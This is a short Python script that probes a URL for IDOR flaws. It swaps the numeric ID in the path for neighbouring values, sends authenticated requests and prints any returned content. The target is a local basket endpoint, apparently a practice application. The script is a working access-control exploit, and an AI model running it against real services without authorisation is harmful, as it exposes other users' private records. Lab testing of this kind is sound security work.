import re
import requests

TOKEN = "PASTE_YOUR_SESSION_TOKEN_HERE"

HEADERS = {"Authorization": f"Bearer {TOKEN}"}

def hunt_idor(url):
    match = re.search(r'/(\d{2,})(?:/|$|\?)', url)
    if not match:
        # fallback: also try single-digit IDs, since basket IDs can be small
        match = re.search(r'/(\d+)$', url)
    if not match:
        print("No number found in this URL to test")
        return

    original_id = match.group(1)
    print(f"Testing around ID: {original_id}")

    for test_id in [str(int(original_id) - 1), str(int(original_id) + 1)]:
        test_url = url.replace(original_id, test_id, 1)
        r = requests.get(test_url, headers=HEADERS)
        print(f"  ID {test_id}: status={r.status_code}, size={len(r.text)}")
        if r.status_code == 200:
            print(f"    -> {r.text[:200]}")

hunt_idor("http://127.0.0.1:3000/rest/basket/6")
